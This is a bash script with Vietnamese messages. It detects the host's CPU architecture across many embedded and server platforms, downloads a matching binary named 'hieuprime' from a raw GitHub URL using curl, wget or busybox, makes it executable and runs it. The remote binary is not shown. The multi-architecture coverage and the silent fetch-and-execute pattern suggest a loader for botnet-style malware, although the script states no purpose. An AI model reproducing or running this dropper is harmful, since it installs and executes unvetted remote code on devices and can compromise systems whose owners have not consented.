#!/bin/bash

BASE_URL="https://github.com/mdn-gay/1239277489294m/raw/refs/heads/main/bins"
BINARY_PREFIX="hieuprime"

# Đã sửa lại bảng Mapping để khớp 100% với tên file từ Script Build (Go)
declare -A ARCH_MAP=(
    ["386"]="386"
    ["amd64"]="amd64"
    ["armv7"]="armv7"
    ["armv6"]="armv6"
    ["armv5"]="armv5"
    ["arm64"]="arm64"
    ["mips"]="mips"
    ["mipsle"]="mipsle"
    ["mips64"]="mips64"
    ["mips64le"]="mips64le"
    ["ppc64"]="ppc64"
    ["ppc64le"]="ppc64le"
    ["s390x"]="s390x"
    ["riscv64"]="riscv64"
)

detect_arch() {
    local ARCH=$(uname -m | tr '[:upper:]' '[:lower:]')
    
    case "$ARCH" in
        x86_64|amd64) echo "amd64" ;;
        i386|i486|i586|i686|386) echo "386" ;;
        armv7l|armv7*|armv7) echo "armv7" ;;
        armv6l|armv6*) echo "armv6" ;;
        armv5*) echo "armv5" ;;
        aarch64|arm64) echo "arm64" ;;
        mips64el|mips64le) echo "mips64le" ;;
        mips64) echo "mips64" ;;
        mipsel|mipsle) echo "mipsle" ;;
        mips*) echo "mips" ;;
        ppc64le) echo "ppc64le" ;;
        ppc64) echo "ppc64" ;;
        s390x) echo "s390x" ;;
        riscv64|rv64) echo "riscv64" ;;
        *) echo "unsupported" ;;
    esac
}

ARCH_SUFFIX=$(detect_arch)

if [ "$ARCH_SUFFIX" = "unsupported" ]; then
    echo "[-] Kiến trúc không được hỗ trợ: $(uname -m)"
    exit 1
fi

# Tạo tên file chính xác: hieuprime_xxx (ví dụ: hieuprime_amd64)
BINARY_NAME="${BINARY_PREFIX}_${ARCH_MAP[$ARCH_SUFFIX]}"
TARGET_URL="$BASE_URL/$BINARY_NAME"

echo "[+] Máy của bạn: $ARCH_SUFFIX"
echo "[+] Đang tải file: $BINARY_NAME"
echo "[+] URL: $TARGET_URL"

check_busybox() {
    if busybox wget --help >/dev/null 2>&1; then echo "busybox wget"; return 0
    elif busybox curl --help >/dev/null 2>&1; then echo "busybox curl"; return 0
    fi
    return 1
}

download_binary() {
    local max_retries=3
    local retry=0
    local downloader=""
    
    if command -v curl >/dev/null 2>&1; then downloader="curl"
    elif command -v wget >/dev/null 2>&1; then downloader="wget"
    elif check_busybox; then downloader=$(check_busybox)
    else return 1; fi
    
    while [ $retry -lt $max_retries ]; do
        case $downloader in
            "curl") curl -L -f -o "$BINARY_NAME" "$TARGET_URL" --silent --fail && return 0 ;;
            "wget") wget -q -O "$BINARY_NAME" "$TARGET_URL" && return 0 ;;
            "busybox wget") busybox wget -q -O "$BINARY_NAME" "$TARGET_URL" && return 0 ;;
            "busybox curl") busybox curl -L -f -o "$BINARY_NAME" "$TARGET_URL" --silent && return 0 ;;
        esac
        retry=$((retry + 1))
        sleep 2
    done
    return 1
}

if download_binary; then
    chmod +x "$BINARY_NAME"
    echo "[+] Tải xong. Đang khởi chạy..."
    exec ./"$BINARY_NAME"
else
    echo "[-] Lỗi tải file."
    exit 1
fi
